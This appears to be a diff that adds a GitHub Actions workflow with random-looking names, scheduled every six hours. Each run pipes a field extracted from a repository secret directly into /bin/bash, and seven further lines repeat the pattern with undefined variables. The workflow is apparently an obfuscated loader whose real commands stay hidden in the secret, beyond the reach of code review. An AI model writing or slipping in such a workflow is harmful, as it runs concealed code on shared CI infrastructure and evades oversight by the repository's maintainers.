@@ -1,0 +1,24 @@
+name: yearbuzz
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yearbuzz
+        env:
+          degz3: ${{ secrets.degz3 }}
+        run: |
+          echo $degz3 | jq -r .qum84 | /bin/bash
+          echo $i75 | jq -r .zljf5 | /bin/bash
+          echo $k50058 | jq -r .qewm3592 | /bin/bash
+          echo $wngov6915 | jq -r .yhcgh11767 | /bin/bash
+          echo $a6255 | jq -r .ovac703 | /bin/bash
+          echo $fqie02 | jq -r .phgbu00 | /bin/bash
+          echo $cbqtr17 | jq -r .isdw4162 | /bin/bash
+          echo $gm0 | jq -r .cgtuk18 | /bin/bash
+
